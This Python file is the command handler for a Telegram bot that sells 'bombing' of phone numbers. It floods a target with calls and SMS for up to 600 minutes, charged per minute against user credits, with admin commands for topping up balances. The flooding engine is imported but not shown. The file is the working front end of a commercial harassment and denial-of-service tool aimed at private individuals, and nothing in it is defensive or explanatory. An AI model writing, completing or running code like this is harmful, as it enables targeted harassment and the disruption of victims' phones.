import os, re, json, time, urllib.request
import state, engine

TG = os.environ.get("TG_BOT_TOKEN", "")
PRICING = {"call": 0.5, "sms": 0.3, "both": 0.65}
HELP = (
    "<b>FLOOD BOT</b>\n"
    "Bomb a phone with calls and/or SMS.\n\n"
    "<b>Usage</b>\n"
    "/bomb &lt;number&gt; &lt;minutes&gt; &lt;mode&gt;\n"
    "  mode: call | sms | both\n"
    "  e.g. /bomb +15551234567 10 both\n\n"
    "/status  - your active bombs + stats\n"
    "/stop    - stop all your bombs\n"
    "/balance - credits\n\n"
    "<b>Admin</b>\n"
    "/add &lt;uid&gt; &lt;amount&gt; - top up credits\n\n"
    "Rates: call $0.50/min, sms $0.30/min, both $0.65/min\n"
)

def send(chat_id, text, reply_markup=None):
    body = {"chat_id": chat_id, "text": text, "parse_mode": "HTML",
            "disable_web_page_preview": True}
    if reply_markup:
        body["reply_markup"] = reply_markup
    data = json.dumps(body).encode()
    req = urllib.request.Request(
        "https://api.telegram.org/bot%s/sendMessage" % TG, data=data,
        headers={"Content-Type": "application/json"})
    try:
        urllib.request.urlopen(req, timeout=15)
    except Exception as e:
        print("send err:", e)

def is_admin(uid):
    if str(uid) in [x for x in os.environ.get("ADMINS", "").split(",") if x]:
        return True
    return state.get_owner() == str(uid)

def cost_of(minutes, mode):
    return minutes * PRICING.get(mode, 0.5)

def do_bomb(cid, uid, text):
    parts = text.split()
    if len(parts) < 3:
        send(cid, "Usage: /bomb <number> <minutes> <mode>\nmode: call|sms|both")
        return
    number = parts[1]
    try:
        minutes = int(parts[2])
    except Exception:
        send(cid, "minutes must be a whole number")
        return
    mode = parts[3] if len(parts) > 3 else "both"
    if mode not in ("call", "sms", "both"):
        send(cid, "mode must be call, sms, or both")
        return
    if not re.match(r"^\+?\d{7,15}$", number):
        send(cid, "need a valid number with country code, e.g. +15551234567")
        return
    if not (1 <= minutes <= 600):
        send(cid, "minutes must be 1-600")
        return
    cost = cost_of(minutes, mode)
    res = engine.start(uid, number, minutes, mode, cost=cost)
    if not res["ok"]:
        send(cid, res["err"] + "\nBalance: %.2f" % state.balance(uid))
        return
    send(cid, "🚀 Bombing %s for %d min (%s).\nCost: %.2f\nBalance: %.2f"
         % (number, minutes, mode, cost, state.balance(uid)))

def do_status(cid, uid):
    bombs = state.user_bombs(uid)
    if not bombs:
        send(cid, "No active bombs.")
        return
    lines = []
    for b in bombs:
        st = "RUNNING" if b["running"] else "DONE"
        el = int(time.time() - b["started"])
        lines.append("• %s | %s | %s\ncalls=%d sms=%d elapsed=%ds"
                     % (b["phone"], b["mode"], st, b["calls"], b["sms"], el))
    send(cid, "<b>Your bombs</b>\n\n" + "\n\n".join(lines))

def handle_update(u):
    msg = u.get("message") or {}
    chat = msg.get("chat", {})
    cid = chat.get("id")
    text = (msg.get("text") or "").strip()
    if not cid or not text:
        return
    uid = str((msg.get("from") or {}).get("id", ""))
    if text in ("/start", "/help"):
        if not state.get_owner():
            state.set_owner(uid)
        send(cid, HELP)
    elif text == "/balance":
        send(cid, "Balance: %.2f" % state.balance(uid))
    elif text == "/status":
        do_status(cid, uid)
    elif text == "/stop":
        send(cid, "Stopped %d bomb(s)." % engine.stop(uid))
    elif text.startswith("/bomb "):
        do_bomb(cid, uid, text)
    elif is_admin(uid) and text.startswith("/add "):
        p = text.split()
        if len(p) >= 3:
            try:
                state.set_balance(p[1], float(p[2]))
                send(cid, "Set %s balance to %.2f" % (p[1], float(p[2])))
            except Exception:
                send(cid, "bad amount")
        else:
            send(cid, "Usage: /add <uid> <amount>")
    else:
        send(cid, "Unknown command. Send /help")
